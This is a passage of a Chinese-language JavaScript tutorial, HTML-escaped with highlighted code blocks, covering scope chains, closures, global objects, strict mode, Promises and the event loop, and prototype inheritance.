punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; undefined&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;作用域链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#作用域链&#34;&gt;#&lt;/a&gt; 作用域链&lt;/h3&gt;
&lt;p&gt;当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为作用域链。&lt;/p&gt;
&lt;h2 id=&#34;闭包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#闭包&#34;&gt;#&lt;/a&gt; 闭包&lt;/h2&gt;
&lt;p&gt;函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。&lt;/p&gt;
&lt;p&gt;在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素 / 方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; Counter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; privateCounter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    privateCounter &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;decrement&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; privateCounter&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 0 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 2 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;decrement&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 1 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;全局对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局对象&#34;&gt;#&lt;/a&gt; 全局对象&lt;/h2&gt;
&lt;p&gt;全局对象是一个特殊的对象，它的作用域是全局的。&lt;/p&gt;
&lt;p&gt;全平台可用的全局对象是  &lt;code&gt;globalThis&lt;/code&gt;  ，它跟全局作用域里的 this 值相同。另外在浏览器中存在  &lt;code&gt;self&lt;/code&gt;  和  &lt;code&gt;window&lt;/code&gt;  全局对象，Web Workers 中存在  &lt;code&gt;self&lt;/code&gt;  全局对象，Node.js 中存在  &lt;code&gt;global&lt;/code&gt;  全局对象。&lt;/p&gt;
&lt;h1 id=&#34;严格模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#严格模式&#34;&gt;#&lt;/a&gt; 严格模式&lt;/h1&gt;
&lt;h2 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离 “马虎模式 / 稀松模式 / 懒散模式 “（sloppy）模式在更严格的条件下运行。严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义。&lt;/p&gt;
&lt;p&gt;引入严格模式的目的主要是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过抛出错误来消除了一些原有静默错误&lt;/li&gt;
&lt;li&gt;消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为&lt;/li&gt;
&lt;li&gt;消除代码运行的一些不安全之处，保证代码运行的安全&lt;/li&gt;
&lt;li&gt;修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度&lt;/li&gt;
&lt;li&gt;禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用&#34;&gt;#&lt;/a&gt; 调用&lt;/h2&gt;
&lt;p&gt;严格模式使用  &lt;code&gt;&amp;quot;use strict&amp;quot;;&lt;/code&gt;  字符串开启。对整个脚本文件而言，可以将  &lt;code&gt;&amp;quot;use strict&amp;quot;&lt;/code&gt;  放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。&lt;/p&gt;
&lt;p&gt;对单个函数而言，将  &lt;code&gt;&amp;quot;use strict&amp;quot;&lt;/code&gt;  放在函数体的第一行，则整个函数以严格模式运行。&lt;/p&gt;
&lt;h2 id=&#34;行为改变&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行为改变&#34;&gt;#&lt;/a&gt; 行为改变&lt;/h2&gt;
&lt;p&gt;在严格模式中，主要有以下的行为更改：&lt;/p&gt;
&lt;h3 id=&#34;全局变量显式声明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局变量显式声明&#34;&gt;#&lt;/a&gt; 全局变量显式声明&lt;/h3&gt;
&lt;p&gt;在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;&amp;quot;use strict&amp;quot;;
for(i = 0; i &amp;lt; 2; i++) &amp;#123; // ReferenceError: i is not defined
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;禁止使用with语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#禁止使用with语句&#34;&gt;#&lt;/a&gt; 禁止使用 with 语句&lt;/h3&gt;
&lt;p&gt;with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。&lt;/p&gt;
&lt;h3 id=&#34;创设eval作用域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创设eval作用域&#34;&gt;#&lt;/a&gt; 创设 eval 作用域&lt;/h3&gt;
&lt;p&gt;正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。&lt;/p&gt;
&lt;h3 id=&#34;禁止删除变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#禁止删除变量&#34;&gt;#&lt;/a&gt; 禁止删除变量&lt;/h3&gt;
&lt;p&gt;严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。&lt;/p&gt;
&lt;h3 id=&#34;显式报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显式报错&#34;&gt;#&lt;/a&gt; 显式报错&lt;/h3&gt;
&lt;p&gt;正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对一个对象的只读属性进行赋值&lt;/li&gt;
&lt;li&gt;对一个使用 getter 方法读取的属性进行赋值&lt;/li&gt;
&lt;li&gt;对禁止扩展的对象添加新属性&lt;/li&gt;
&lt;li&gt;删除一个不可删除的属性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;语法错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#语法错误&#34;&gt;#&lt;/a&gt; 语法错误&lt;/h3&gt;
&lt;p&gt;严格模式新增了一些语法错误，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对象不能有重名的属性&lt;/li&gt;
&lt;li&gt;函数不能有重名的参数&lt;/li&gt;
&lt;li&gt;禁止八进制表示法&lt;/li&gt;
&lt;li&gt;函数必须声明在顶层&lt;/li&gt;
&lt;li&gt;新增保留字
&lt;ul&gt;
&lt;li&gt;class&lt;/li&gt;
&lt;li&gt;enum&lt;/li&gt;
&lt;li&gt;export&lt;/li&gt;
&lt;li&gt;extends&lt;/li&gt;
&lt;li&gt;import&lt;/li&gt;
&lt;li&gt;super&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安全增强&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全增强&#34;&gt;#&lt;/a&gt; 安全增强&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;禁止 this 关键字指向全局对象&lt;/li&gt;
&lt;li&gt;禁止在函数内部遍历调用栈&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;限制arguments对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#限制arguments对象&#34;&gt;#&lt;/a&gt; 限制 arguments 对象&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;不允许对 arguments 赋值&lt;/li&gt;
&lt;li&gt;arguments 不再追踪参数的变化&lt;/li&gt;
&lt;li&gt;禁止使用 arguments.callee&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;异步机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#异步机制&#34;&gt;#&lt;/a&gt; 异步机制&lt;/h1&gt;
&lt;h2 id=&#34;async-await&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#async-await&#34;&gt;#&lt;/a&gt; async / await&lt;/h2&gt;
&lt;p&gt;async function 关键字用来在表达式中定义异步函数。&lt;/p&gt;
&lt;h2 id=&#34;promise&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#promise&#34;&gt;#&lt;/a&gt; Promise&lt;/h2&gt;
&lt;p&gt;Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象&lt;/p&gt;
&lt;p&gt;一个 Promise 有以下几种状态:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pending: 初始状态，既不是成功，也不是失败状态。&lt;/li&gt;
&lt;li&gt;fulfilled: 意味着操作成功完成。&lt;/li&gt;
&lt;li&gt;rejected: 意味着操作失败。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法， 所以在异步操作的完成和绑定处理方法之间不存在竞争）。&lt;/p&gt;
&lt;p&gt;因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象， 所以它们可以被链式调用。&lt;/p&gt;
&lt;h2 id=&#34;执行队列&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行队列&#34;&gt;#&lt;/a&gt; 执行队列&lt;/h2&gt;
&lt;p&gt;JavaScript 中的异步运行机制如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有同步任务都在主线程上执行，形成一个执行栈&lt;/li&gt;
&lt;li&gt;主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。&lt;/li&gt;
&lt;li&gt;一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。&lt;/li&gt;
&lt;li&gt;主线程不断重复上面的第三步。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 DOM 事件、时间回调、网络回调三种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。&lt;/li&gt;
&lt;li&gt;时间回调：setTimeout /setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。&lt;/li&gt;
&lt;li&gt;网络回调：ajax /fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;原型链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链&#34;&gt;#&lt;/a&gt; 原型链&lt;/h1&gt;
&lt;h2 id=&#34;显式原型和隐式原型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显式原型和隐式原型&#34;&gt;#&lt;/a&gt; 显式原型和隐式原型&lt;/h2&gt;
&lt;p&gt;JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。&lt;/p&gt;
&lt;p&gt;其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性&lt;/p&gt;
&lt;p&gt;隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过  &lt;code&gt;__proto__&lt;/code&gt;  来访问。ES5 中有了对于这个内置属性标准的 Get 方法  &lt;code&gt;Object.getPrototypeOf()&lt;/code&gt;  。&lt;/p&gt;
&lt;p&gt;隐式原型指向创建这个对象的函数 (constructor) 的 prototype，  &lt;code&gt;__proto__&lt;/code&gt;  指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。&lt;/p&gt;
&lt;p&gt;显式原型的作用用来实现基于原型的继承与属性的共享。 隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着  &lt;code&gt;__proto__&lt;/code&gt;  依次查找。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Note: Object.prototype 这个对象是个例外，它的__proto__值为null
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;new-的过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#new-的过程&#34;&gt;#&lt;/a&gt; new 的过程&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;var Person = function()&amp;#123;&amp;#125;;
var p = new Person();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;new 的过程拆分成以下三步： -  &lt;code&gt;var p=&amp;#123;&amp;#125;;&lt;/code&gt;  初始化一个对象 p -  &lt;code&gt;p.__proto__ = Person.prototype;&lt;/code&gt;  -  &lt;code&gt;Person.call(p);&lt;/code&gt;  构造 p，也可以称之为初始化 p&lt;/p&gt;
&lt;p&gt;关键在于第二步，我们来证明一下：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token function-variable function&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token 